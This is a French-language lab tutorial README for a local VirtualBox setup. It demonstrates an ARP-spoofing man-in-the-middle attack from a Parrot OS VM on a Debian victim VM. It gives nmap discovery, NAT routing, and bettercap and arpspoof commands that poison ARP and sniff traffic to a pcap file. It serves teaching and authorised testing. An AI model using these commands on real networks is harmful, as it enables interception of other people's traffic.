<p align="center">
<img src="MITM%20attack.PNG" alt="MITM Attack" width="500"/>
</p>

<h1 align="center">MITM Attack</h1>

<p align="center">
Du scénario Hacker à la défense
</p>

---

# 🚨 MITM Attack — Scénario pédagogique en labo local

![MITM Attack](MITM_attack.PNG)

##  Objectif
Montrer, dans un environnement **100% local**, comment un attaquant placé dans un lieu public (gare, aéroport, café…) pourrait intercepter le trafic d’une victime via **ARP spoofing**.

⚠️ **Légal / éthique** : ne jamais appliquer hors d’un labo dont vous avez le contrôle.
Ce guide est destiné à l’**apprentissage/défense** et au **pentest autorisé uniquement**.

---

##  Sommaire

1. Contexte “hacker en lieu public”
2. Architecture du labo & prérequis
3. Paramétrage VirtualBox
4. Adressage & tests LAN
5. Découverte réseau (Nmap)
6. Transformer Parrot en routeur NAT
7. Configurer la victime pour sortir sur Internet via Parrot
8. Attaque MITM (Bettercap ou arpspoof)
9. Observation du trafic (tcpdump / Wireshark)
10. Option : Proxy/Burp (HTTP)
11. Nettoyage complet des machines
12. Dépannage rapide

---

##  Contexte “hacker en lieu public”

Dans un **aéroport** ou un **café**, un attaquant peut se placer entre les clients et Internet :

- créer un faux hotspot ou s’insérer dans un réseau existant,
- empoisonner l’ARP (MITM) pour que la victime envoie son trafic à l’attaquant,
- observer ou modifier le trafic non chiffré (HTTP, DNS, etc.).

👉 Dans ce projet, nous reproduisons ces techniques **en labo local** pour apprendre à les comprendre et s’en défendre.

---

## 🧱 Architecture du labo & prérequis  

### VMs  

**Parrot OS (attaquant)**  
- NIC1 : NAT (sortie Internet de la VM) → enp0s8 (ex. 10.0.3.15/24)  
- NIC2 : Internal Network nommé LAB → enp0s3  

**Debian (victime)**  
- NIC1 : Internal Network LAB → enp0s3  

---

### 🗺️ Plan d’adressage (réseau interne LAB)  
- Parrot (enp0s3) : 192.168.100.20/24  
- Debian (enp0s3) : 192.168.100.10/24  
- Passerelle “vue par Debian” : 192.168.100.20 (Parrot)  

---

### 🛠️ Logiciels utiles (côté Parrot)  
- nmap  
- bettercap (ou dsniff/arpspoof)  
- tcpdump  
- wireshark  
- iptables  

---

## ⚙️ Paramétrage VirtualBox  

**Parrot → Paramètres > Réseau**  
- Carte 1 : NAT  
- Carte 2 : Réseau interne → Nom : LAB  

**Debian → Paramètres > Réseau**  
- Carte 1 : Réseau interne → Nom : LAB  

➡️ Démarrez les deux VMs.  

---

## 🔢 Adressage & tests LAN  

### Parrot (root)  
p addr add 192.168.100.20/24 dev enp0s3
ip link set enp0s3 up
ip -br a

### Debian (root)  
ip addr add 192.168.100.10/24 dev enp0s3
ip link set enp0s3 up
ip -br a

## 🔢 Adressage & tests LAN

<table>
<tr>
<td align="center"><b>Parrot (attaquant)</b><br>
<img src="./senarioparrot1.PNG" alt="Parrot IP" width="420">
</td>
<td align="center"><b>Debian (victime)</b><br>
<img src="./senariodebian1.PNG" alt="Debian IP" width="420">
</td>
</tr>
</table>

---

### ✅ Tests LAN  
Depuis Debian :  

ping 192.168.100.20

Depuis Parrot :  
ping 192.168.100.10

✔️ Réponses reçues = réseau interne OK  

**Tests ping**
<p align="center">
<img src="./senarioping1.PNG" alt="Ping LAN OK" width="600">
</p>

---

## 🔎 Découverte réseau (Nmap)  

Sur Parrot :  
nmap -sn 192.168.100.0/24

Résultat attendu :  
- 192.168.100.10 (Debian)  
- 192.168.100.20 (Parrot)

## 🔎 Découverte réseau (Nmap)
<p align="center">
<img src="./senarionmap.PNG" alt="Nmap scan 192.168.100.0/24" width="720">
</p>


## 🔁 Transformer Parrot en routeur NAT  

### Sur Parrot (root)  

Activer le routage IPv4 (temporaire) :  

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -t nat -A POSTROUTING -o enp0s8 -j MASQUERADE

---

## 🌐 Configurer la victime pour sortir sur Internet via Parrot  

### Sur Debian (root)  

Définir Parrot comme passerelle par défaut :  
ip route add default via 192.168.100.20 dev enp0s3

Configurer un DNS (temporaire, pour le TP) :  

ping -c 3 8.8.8.8   # doit répondre
ping -c 3 google.com   # doit répondre si DNS OK

---

## 🕵️ Attaque MITM (Bettercap ou arpspoof)  

### Option A — Bettercap *(recommandé)*  

Sur Parrot :  
bettercap -iface enp0s3

Dans la console bettercap :  
net.recon on
net.show

set arp.spoof.targets 192.168.100.10
arp.spoof on

set net.sniff.output /root/capture.pcap
net.sniff on

arpspoof -i enp0s3 -t 192.168.100.10 192.168.100.1
arpspoof -i enp0s3 -t 192.168.100.1 192.168.100.10

ℹ️ Ici `192.168.100.1` représente la “passerelle” vue par la victime.  
👉 Dans notre montage, où Parrot **est déjà la passerelle**, il est plus simple et plus sûr d’utiliser **Bettercap**.  
